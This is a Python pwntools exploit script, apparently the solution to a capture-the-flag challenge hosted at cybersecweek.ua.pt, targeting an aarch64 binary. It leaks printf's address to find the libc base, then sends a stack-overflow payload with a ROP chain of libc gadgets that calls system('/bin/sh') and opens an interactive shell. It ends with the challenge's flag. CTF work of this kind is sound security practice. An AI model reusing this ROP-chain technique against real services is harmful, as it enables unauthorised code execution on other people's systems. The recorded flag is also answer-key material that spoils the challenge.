#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host cybersecweek.ua.pt --port 2014 ./chal
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chal')
context.arch = 'aarch64'
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'cybersecweek.ua.pt'
port = int(args.PORT or 2014)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     aarch64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

libc = ELF("./libc.so.6.old")
print(hex(libc.sym['printf']))

io.recvuntil(b"Welcome to RPi ")
libc.address = int(io.recvline()[:-2],16) - libc.sym['printf'] 
print(hex(libc.address ))
main = libc.address + 0x99c#0x100a04 99c
test= libc.address + 0x0000000000000870
# rop = ROP([libc])
# rop.raw(b'a'*8*8)
# rop.raw(b'a'*8*2)
# rop.system(next(libc.search("/bin/sh\x00")))
# rop.puts(libc.got['puts'])
payload  = b''
payload += 64 * b'A'
payload += 8 * b'B'
payload += p64(libc.search(asm('ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret;')).__next__())
payload += (8 * 3) * b'C'
payload += p64(libc.search(asm('mov x0, x19; ldr x19, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret;')).__next__())
payload += p64(libc.search(b"/bin/sh").__next__())
payload += (8 * 2) * b'D'
payload += p64(libc.sym.system)
# print(rop.dump())
io.sendlineafter(b"> ",payload)

# CTFUA{#4RM_PWN1NG_FTW#}
io.interactive()

